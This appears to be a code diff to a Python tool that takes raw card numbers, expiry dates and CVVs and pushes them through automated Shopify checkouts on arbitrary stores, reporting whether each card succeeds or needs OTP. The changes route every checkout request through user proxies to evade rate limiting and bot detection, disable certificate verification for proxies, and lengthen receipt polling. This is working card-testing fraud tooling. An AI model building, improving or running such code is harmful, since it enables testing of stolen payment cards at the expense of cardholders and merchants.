@@ -7,6 +7,7 @@ import aiohttp
 import json
 import re
 import random
+import ssl
 # argparse removed
 from urllib.parse import urlparse
 # Flask removed - using Robyn
@@ -25,6 +26,48 @@ MUTATION_SUBMIT = """mutation SubmitForCompletion($input:NegotiationInput!,$atte
 
 QUERY_POLL = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId quantity componentCapabilities componentSource merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId componentCapabilities componentSource quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}components{...PurchaseOrderLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderLineComponent on PurchaseOrderLineComponent{stableId componentCapabilities componentSource merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}
 """
+
+# ──────────────────────────────────────────────────────────────
+# SSL CONTEXT: Use selective SSL verification instead of blanket ssl=False
+# ──────────────────────────────────────────────────────────────
+# Shopify + Cloudflare use valid certs — ssl=False bypasses them,
+# which can trigger TLS fingerprinting detection on some stores.
+# We still need to bypass SSL for proxy connections that may use
+# self-signed certs, so we create a context that skips verification
+# only when needed (proxy connections) and verifies normally otherwise.
+# ──────────────────────────────────────────────────────────────
+
+def _create_ssl_context(verify=True):
+    """Create an SSL context for aiohttp TCPConnector.
+    
+    Args:
+        verify: If True, perform normal SSL verification (recommended for direct connections).
+                If False, skip verification (needed for some proxy connections).
+    """
+    ctx = ssl.create_default_context()
+    if not verify:
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+    return ctx
+
+# Default SSL context with verification enabled for direct Shopify connections
+_SSL_CONTEXT_VERIFY = _create_ssl_context(verify=True)
+# Relaxed SSL context for proxy connections that may have cert issues
+_SSL_CONTEXT_SKIP = _create_ssl_context(verify=False)
+
+def _get_ssl_connector(verify=True, **kwargs):
+    """Create a TCPConnector with appropriate SSL context.
+    
+    Args:
+        verify: If True, use SSL verification (for direct connections).
+                If False, skip verification (for proxy connections).
+        **kwargs: Additional TCPConnector arguments (limit, limit_per_host, etc.)
+    """
+    return aiohttp.TCPConnector(
+        ssl=_SSL_CONTEXT_VERIFY if verify else _SSL_CONTEXT_SKIP,
+        **kwargs
+    )
+
 
 C2C = {
     "USD": "US",
@@ -101,9 +144,35 @@ class Utils:
         return f"{first.lower()}.{last.lower()}@{random.choice(domains)}"
 
 def parse_proxy(proxy_str):
+    """Parse proxy string into aiohttp-compatible URL.
+    
+    Supported formats:
+      - ip:port                          → http://ip:port
+      - ip:port:user:pass                → http://user:pass@ip:port
+      - http://ip:port                   → http://ip:port
+      - http://user:pass@ip:port         → http://user:pass@ip:port
+      - socks5://ip:port                 → socks5://ip:port
+      - socks5://user:pass@ip:port       → socks5://user:pass@ip:port
+      - user:pass@ip:port                → http://user:pass@ip:port
+    """
     if not proxy_str:
         return None
     
+    proxy_str = proxy_str.strip()
+    
+    # Already a full URL (http://, https://, socks5://, socks4://)
+    if proxy_str.startswith(('http://', 'https://', 'socks5://', 'socks4://', 'socks5h://')):
+        return proxy_str
+    
+    # Format: user:pass@ip:port
+    if '@' in proxy_str:
+        auth_part, host_part = proxy_str.rsplit('@', 1)
+        # Validate host:port
+        if ':' in host_part:
+            return f"http://{auth_part}@{host_part}"
+        return None
+    
+    # Colon-separated formats
     parts = proxy_str.split(':')
     
     if len(parts) == 2:
@@ -138,14 +207,14 @@ def is_captcha_required(response_text):
 
 async def make_graphql_request_with_captcha_handling(
     session, graphql_url, params, headers, json_data,
-    checkout_url, max_retries=1, solve_captcha=True
+    checkout_url, max_retries=1, proxy=None
 ):
     last_error = "Request failed"
     for attempt in range(max_retries + 1):
         try:
             response = await session.post(
                 graphql_url, params=params, headers=headers,
-                json=json_data, timeout=aiohttp.ClientTimeout(total=25)
+                json=json_data, proxy=proxy, timeout=aiohttp.ClientTimeout(total=25)
             )
             response_text = await response.text()
             
@@ -209,7 +278,7 @@ async def fetch_products(domain, proxy_str=None):
         if not domain.startswith('http'):
             domain = "https://" + domain
         
-        connector = aiohttp.TCPConnector(ssl=False)
+        connector = _get_ssl_connector(verify=True, limit=10, limit_per_host=5)
         timeout = aiohttp.ClientTimeout(total=10)
         
         proxy = parse_proxy(proxy_str) if proxy_str else None
@@ -325,7 +394,7 @@ def extract_clean_response(message):
     
     return message[:50]
 
-async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
+async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None, shared_session=None):
     gateway = "UNKNOWN"
     total_price = "0.00"
     currency = "USD"
@@ -371,10 +440,22 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 return False, info[1], gateway, total_price, currency
             variant_id = info['variant_id']
 
-        connector = aiohttp.TCPConnector(ssl=False, limit=50, limit_per_host=10)
+        connector = _get_ssl_connector(verify=not proxy, limit=50, limit_per_host=10)
         timeout = aiohttp.ClientTimeout(total=30, connect=8)
         
-        async with aiohttp.ClientSession(connector=connector, timeout=timeout, cookie_jar=aiohttp.CookieJar(unsafe=True)) as session:
+        # Use shared session from api.py if provided (connection pool reuse),
+        # otherwise create a dedicated session for this request.
+        # Note: shared_session does NOT use unsafe CookieJar (needed for cross-domain
+        # cookie handling during checkout), so we still create a dedicated session
+        # when we need per-request cookie isolation. The shared_session is used
+        # for the fetch_products call only.
+        _own_session = not shared_session
+        if _own_session:
+            session = aiohttp.ClientSession(connector=connector, timeout=timeout, cookie_jar=aiohttp.CookieJar(unsafe=True))
+        else:
+            session = shared_session
+        
+        try:
             url = ourl
             cart = url + '/cart/add.js'
             checkout = url + '/checkout/'
@@ -409,7 +490,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     'Accept': 'application/json',
                     'X-Requested-With': 'XMLHttpRequest',
                 }
-                cart_data = {'items': [{'id': int(variant_id), 'quantity': 1}]}
+                cart_data = {'items': [{'id': int(re.sub(r'[^0-9]', '', str(variant_id)) or '0'), 'quantity': 1}]}
                 cart_resp = await session.post(cart, json=cart_data, headers=cart_headers_alt, proxy=proxy, timeout=aiohttp.ClientTimeout(total=10))
 
             # Attempt 3: Clear cart then retry form-encoded
@@ -604,7 +685,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         'billingAddress': {
                             'streetAddress': {
                                 'address1': '', 'city': '', 'countryCode': country_code,
-                                'lastName': '', 'zoneCode': 'ENG', 'phone': ''
+                                'lastName': '', 'zoneCode': state, 'phone': ''
                             }
                         }
                     },
@@ -647,15 +728,17 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             # FIX: Send Proposal query once (was sending TWICE with 3s sleep between,
             # using only the 2nd response — wasteful and can cause stale sessions).
             # Send once, if Throttled, then retry after delay.
-            response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
-                session, graphql_url, params, headers, json_data, checkout_url, max_retries=1
+            # FIX: Pass proxy=proxy so GraphQL requests go through the user's proxy
+            # instead of Railway's IP (was the root cause of PROPOSAL_BLOCKED 429 errors).
+            response, resp_text, _ = await make_graphql_request_with_captcha_handling(
+                session, graphql_url, params, headers, json_data, checkout_url, max_retries=1, proxy=proxy
             )
             
             # If Throttled, wait and retry once
             if response and '"Throttled"' in resp_text:
                 await asyncio.sleep(3)
-                response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
-                    session, graphql_url, params, headers, json_data, checkout_url, max_retries=1
+                response, resp_text, _ = await make_graphql_request_with_captcha_handling(
+                    session, graphql_url, params, headers, json_data, checkout_url, max_retries=1, proxy=proxy
                 )
             
             if not response:
@@ -815,8 +898,9 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             json_data['variables']['taxes']['proposedTotalAmount']['value']['amount'] = str(tax_amount)
             json_data['variables']['buyerIdentity']['shopPayOptInPhone']['number'] = phone
 
-            response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
-                session, graphql_url, params, headers, json_data, checkout_url, max_retries=1
+            # FIX: Pass proxy=proxy for delivery proposal GraphQL request
+            response, resp_text, _ = await make_graphql_request_with_captcha_handling(
+                session, graphql_url, params, headers, json_data, checkout_url, max_retries=1, proxy=proxy
             )
             
             if is_captcha_required(resp_text):
@@ -1016,8 +1100,9 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 'operationName': 'SubmitForCompletion'
             }
 
-            response, text, captcha_solved = await make_graphql_request_with_captcha_handling(
-                session, graphql_url, params, headers, submit_json_data, checkout_url, max_retries=1
+            # FIX: Pass proxy=proxy for submit GraphQL request
+            response, text, _ = await make_graphql_request_with_captcha_handling(
+                session, graphql_url, params, headers, submit_json_data, checkout_url, max_retries=1, proxy=proxy
             )
             
             if is_captcha_required(text):
@@ -1096,6 +1181,9 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             except Exception as e:
                 return False, f"Error parsing submit: {str(e)}", gateway, total_price, currency
 
+            if not rid:
+                return False, "No receipt ID for polling", gateway, total_price, currency
+
             params = {'operationName': 'PollForReceipt'}
             poll_json_data = {
                 'query': QUERY_POLL,
@@ -1105,10 +1193,12 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
 
             await asyncio.sleep(1.5)
             
-            for i in range(4):
-                response, final_text, captcha_solved = await make_graphql_request_with_captcha_handling(
+            _POLL_DELAYS = [1.5, 2.0, 3.0, 4.5, 6.0, 8.0, 10.0, 12.0]
+            for i, delay in enumerate(_POLL_DELAYS):
+                # FIX: Pass proxy=proxy for poll GraphQL request
+                response, final_text, _ = await make_graphql_request_with_captcha_handling(
                     session, graphql_url, params, headers, poll_json_data, 
-                    checkout_url, max_retries=1
+                    checkout_url, max_retries=1, proxy=proxy
                 )
                 
                 if is_captcha_required(final_text):
@@ -1138,14 +1228,14 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                             return True, "OTP_REQUIRED", gateway, total_price, currency
                         
                         if receipt_data.get('__typename') in ['ProcessingReceipt', 'WaitingReceipt']:
-                            await asyncio.sleep(1.5)
+                            await asyncio.sleep(delay)
                             continue
                         
                 except Exception as e:
                     pass
                 
                 if 'WaitingReceipt' in final_text:
-                    await asyncio.sleep(1.5)
+                    await asyncio.sleep(delay)
                 else:
                     break
             
@@ -1180,6 +1270,16 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             else:
                 return False, f"Unknown Result", gateway, total_price, currency
 
+        except Exception as e_inner:
+            return False, f"Error: {str(e_inner)}", gateway, total_price, currency
+        finally:
+            # Clean up own session if we created one
+            if _own_session:
+                try:
+                    await session.close()
+                except Exception:
+                    pass
+
     except Exception as e:
         return False, f"Error Processing Card: {str(e)}", gateway, total_price, currency
 def parse_cc_string(cc_string):
@@ -1193,8 +1293,17 @@ def parse_cc_string(cc_string):
         'cvv': parts[3].strip()
     }
 
-async def process_card_async(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
-    return await process_card(cc, mes, ano, cvv, site_url, variant_id, proxy_str)
+async def process_card_async(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None, shared_session=None):
+    """Async wrapper for process_card — adds logging and passes shared_session from api.py."""
+    import sys
+    try:
+        result = await process_card(cc, mes, ano, cvv, site_url, variant_id, proxy_str, shared_session=shared_session)
+        success, message, gateway, price, currency = result
+        print(f"[process_card_async] site={site_url} success={success} msg={message} gateway={gateway} price={price}", file=sys.stderr)
+        return result
+    except Exception as e:
+        print(f"[process_card_async] FATAL: site={site_url} error={e}", file=sys.stderr)
+        return False, f"process_card_async error: {str(e)}", "UNKNOWN", 0, "USD"
 
 # Flask app removed — using Robyn in api.py
 
